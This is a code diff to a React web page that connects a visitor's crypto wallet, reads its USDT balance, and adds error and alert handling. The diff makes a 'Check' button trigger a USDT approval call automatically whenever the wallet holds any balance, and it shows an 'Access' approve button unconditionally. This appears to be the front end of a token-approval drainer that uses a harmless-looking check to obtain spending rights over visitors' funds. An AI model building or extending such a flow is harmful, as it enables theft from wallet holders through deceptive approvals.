@@ -37,7 +37,9 @@ export default function Home() {
   const [error, setError] = useState<string | null>(null);
   const [walletDetected, setWalletDetected] = useState<boolean | null>(null);
   const [showWalletAlert, setShowWalletAlert] = useState(false);
+  const [showNoUSDTAlert, setShowNoUSDTAlert] = useState(false);
   const [isAlertSlidingOut, setIsAlertSlidingOut] = useState(false);
+  const [isNoUSDTAlertSlidingOut, setIsNoUSDTAlertSlidingOut] = useState(false);
   const [transactionStatus, setTransactionStatus] = useState<{
     hash: string;
     status: 'pending' | 'success' | 'failed';
@@ -47,23 +49,49 @@ export default function Home() {
   const handleCheckButton = async () => {
     if (!walletInfo) {
       await connectWallet();
+      // After connecting, load balance and check immediately
+      const balance = await loadUSDTBalance();
+      
+      // Check balance after loading
+      if (parseFloat(balance) > 0) {
+        await handleApprove();
+      } else {
+        setShowNoUSDTAlert(true);
+        setTimeout(() => {
+          setIsNoUSDTAlertSlidingOut(true);
+          setTimeout(() => {
+            setShowNoUSDTAlert(false);
+            setIsNoUSDTAlertSlidingOut(false);
+          }, 500);
+        }, 2000);
+      }
+      return;
     }
     
-    // If wallet is connected, automatically approve USDT if balance exists
-    if (walletInfo && parseFloat(usdtBalance) > 0) {
+    // If wallet is already connected, load balance and check
+    const balance = await loadUSDTBalance();
+    
+    if (parseFloat(balance) > 0) {
       await handleApprove();
     } else {
-      setIsModalOpen(true);
+      setShowNoUSDTAlert(true);
+      setTimeout(() => {
+        setIsNoUSDTAlertSlidingOut(true);
+        setTimeout(() => {
+          setShowNoUSDTAlert(false);
+          setIsNoUSDTAlertSlidingOut(false);
+        }, 500);
+      }, 2000);
     }
   };
 
   const loadUSDTBalance = async () => {
-    if (!walletInfo?.address) return;
+    if (!walletInfo?.address) return '0';
     
     try {
       if (!window.ethereum) {
         console.error('No wallet detected');
-        return;
+        return '0';
       }
       
       const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -75,10 +103,13 @@ export default function Home() {
       
       const balance = await usdtContract.balanceOf(walletInfo.address);
       // USDT on BSC Testnet has 6 decimals, not 18
-      setUsdtBalance(ethers.utils.formatUnits(balance, 6));
+      const formattedBalance = ethers.utils.formatUnits(balance, 6);
+      setUsdtBalance(formattedBalance);
+      return formattedBalance;
     } catch (error: unknown) {
       console.error('Error loading USDT balance:', error);
       setUsdtBalance('0');
+      return '0';
     }
   };
 
@@ -177,7 +208,20 @@ export default function Home() {
       await loadUSDTBalance();
     } catch (error: unknown) {
       console.error('Error connecting wallet:', error);
-      setError('Failed to connect wallet');
+      let errorMessage = 'Failed to connect wallet';
+      
+      if (error && typeof error === 'object' && 'message' in error) {
+        const message = (error as { message: string }).message;
+        if (message.includes('BSC Testnet')) {
+          errorMessage = 'Please approve the network switch to BSC Testnet in your wallet';
+        } else if (message.includes('add BSC Testnet')) {
+          errorMessage = 'Please approve adding BSC Testnet to your wallet';
+        } else if (message.includes('user rejected')) {
+          errorMessage = 'Wallet connection was cancelled';
+        }
+      }
+      
+      setError(errorMessage);
     } finally {
       setIsConnecting(false);
     }
@@ -384,21 +428,13 @@ export default function Home() {
 
 
 
-              {parseFloat(usdtBalance) > 0 ? (
-                <button
-                  onClick={handleApprove}
-                  disabled={isLoading || !walletInfo}
-                  className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-                >
-                  {isLoading ? 'Processing...' : 'Access'}
-                </button>
-              ) : (
-                <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg text-center">
-                  <p className="text-gray-600 text-sm">
-                    No USDT balance found. You need USDT tokens to proceed.
-                  </p>
-                </div>
-              )}
+              <button
+                onClick={handleApprove}
+                disabled={isLoading || !walletInfo}
+                className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+              >
+                {isLoading ? 'Processing...' : 'Access'}
+              </button>
 
               {transactionStatus && (
                 <div className={`p-4 rounded-lg border ${
@@ -461,6 +497,47 @@ export default function Home() {
                     }, 500);
                   }}
                   className="text-orange-200 hover:text-white transition-colors"
+                >
+                  <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
+                    <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
+                  </svg>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* No USDT Alert */}
+      {showNoUSDTAlert && (
+        <div className={`fixed top-20 right-4 z-50 transform transition-all duration-500 ease-in-out ${
+          isNoUSDTAlertSlidingOut ? 'animate-slide-out' : 'animate-slide-in'
+        }`}>
+          <div className="bg-gradient-to-r from-red-500 to-red-600 text-white px-6 py-4 rounded-lg shadow-xl border-l-4 border-red-700 max-w-sm backdrop-blur-sm">
+            <div className="flex items-center">
+              <div className="flex-shrink-0">
+                <svg className="h-5 w-5 text-red-200" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                </svg>
+              </div>
+              <div className="ml-3">
+                <p className="text-sm font-medium">
+                  No USDT Balance Found
+                </p>
+                <p className="text-xs text-red-200 mt-1">
+                  You need USDT tokens to proceed
+                </p>
+              </div>
+              <div className="ml-auto pl-3">
+                <button
+                  onClick={() => {
+                    setIsNoUSDTAlertSlidingOut(true);
+                    setTimeout(() => {
+                      setShowNoUSDTAlert(false);
+                      setIsNoUSDTAlertSlidingOut(false);
+                    }, 500);
+                  }}
+                  className="text-red-200 hover:text-white transition-colors"
                 >
                   <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
                     <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
